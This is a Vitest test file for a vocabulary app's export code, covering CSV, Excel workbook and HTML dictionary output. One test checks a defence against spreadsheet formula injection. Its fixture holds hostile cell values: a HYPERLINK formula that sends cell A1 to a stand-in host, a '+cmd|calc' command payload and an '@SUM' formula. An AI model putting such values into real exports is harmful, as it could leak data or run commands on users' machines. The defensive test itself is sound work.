import { describe, expect, it } from 'vitest'
import { strFromU8, unzipSync } from 'fflate'
import { dictionaryHtml, toCsv, toXlsx } from './exportList'
import { createEntry } from './wordInput'
import { newWordState } from '../engine/review'

const NOW = new Date('2026-10-02T10:00:00Z')

describe('exporting the list', () => {
  const maison = createEntry({ word: 'la maison', meaning: 'ev, yuva', example: 'Ma *maison* est "grande"; belle.', exampleTranslation: 'Evim büyük.' }, 'fr', NOW)
  const arbre = createEntry({ word: "l'arbre", meaning: 'ağaç' }, 'fr', NOW)

  it('writes a comma CSV with a BOM, quoting what needs it', () => {
    const csv = toCsv([maison, arbre], [newWordState(maison, NOW)])
    expect(csv.startsWith('\uFEFFDil,Kelime,Artikel')).toBe(true)
    const lines = csv.slice(1).split('\r\n')
    expect(lines).toHaveLength(3)
    expect(lines[1]).toContain('Fransızca,maison,la,noun,ev,yuva,')
    expect(lines[1]).toContain('"Ma maison est ""grande""; belle."')
    expect(lines[1]).toContain(',Tohum,')
    expect(lines[2]).toContain(',Başlanmadı,')
  })

  it('can still write the semicolon form some regional Excels expect', () => {
    const lines = toCsv([maison], [], ';').slice(1).split('\r\n')
    expect(lines[0]).toBe('Dil;Kelime;Artikel;Tür;Anlam;Diğer anlamlar;Tanım;IPA;Örnek;Örnek çevirisi;Kalıplar;Etiketler;Not;Aşama;Sıradaki tekrar;Eklenme')
    expect(lines[1]).toContain('Fransızca;maison;la;noun;ev;yuva;')
  })

  it('writes an Excel workbook: one row a word, accents and markup characters intact', () => {
    const odd = { ...arbre, notes: 'a < b & "c"\u0001', senses: [{ ...arbre.senses[0], gloss: 'ağaç, çınar' }] }
    const files = unzipSync(toXlsx([maison, odd], [newWordState(maison, NOW)]))
    expect(Object.keys(files).sort()).toEqual(['[Content_Types].xml', '_rels/.rels', 'xl/_rels/workbook.xml.rels', 'xl/styles.xml', 'xl/workbook.xml', 'xl/worksheets/sheet1.xml'])
    const sheet = strFromU8(files['xl/worksheets/sheet1.xml'])
    expect(sheet.match(/<row /g)).toHaveLength(3)
    expect(sheet).toContain('<c r="A1" t="inlineStr" s="1"><is><t xml:space="preserve">Dil</t></is></c>')
    expect(sheet).toContain('>Fransızca<')
    expect(sheet).toContain('ağaç, çınar')
    expect(sheet).toContain('a &lt; b &amp; "c"')
    expect(sheet).not.toContain('\u0001')
    expect(sheet).toContain('<pane ySplit="1"')
    for (const name of Object.keys(files)) expect(strFromU8(files[name]).startsWith('<?xml')).toBe(true)
  })

  it('prints an alphabetical dictionary with letter headings, escaping text', () => {
    const html = dictionaryHtml([maison, { ...arbre, notes: '<b>' }], 'fr', 'Sözlüğüm')
    expect(html.indexOf("l'arbre")).toBeLessThan(html.indexOf('la maison'))
    expect(html).toContain('<h2>A</h2>')
    expect(html).toContain('<h2>M</h2>')
    expect(html).toContain('2 kelime')
    expect(html).not.toContain('*maison*')
  })

  it('does not let a cell run as a spreadsheet formula (CSV)', () => {
    const evil = { ...maison, lemma: '=HYPERLINK("http://x/?q="&A1,"x")', notes: '+cmd|calc', tags: ['@SUM(1+1)'] }
    const csv = toCsv([evil], [])
    expect(csv).toContain(`"'=HYPERLINK(""http://x/?q=""&A1,""x"")"`)
    expect(csv).toContain("'+cmd|calc")
    expect(csv).toContain("'@SUM(1+1)")
    // Ordinary text is left as it is, even a word with a hyphen inside.
    expect(toCsv([{ ...arbre, lemma: 'peut-être' }], [])).toContain(',peut-être,')
  })

  it('still exports when a date is unreadable or a word has no meaning', () => {
    const odd = { ...maison, addedAt: {} as unknown as Date, senses: [] }
    const state = { ...newWordState(maison, NOW), skills: { recognition: { due: {} } } } as unknown as ReturnType<typeof newWordState>
    expect(() => toCsv([odd, maison], [state])).not.toThrow()
    expect(() => toXlsx([odd, maison], [state])).not.toThrow()
    expect(() => dictionaryHtml([odd, maison], 'fr', 'x')).not.toThrow()
  })
})

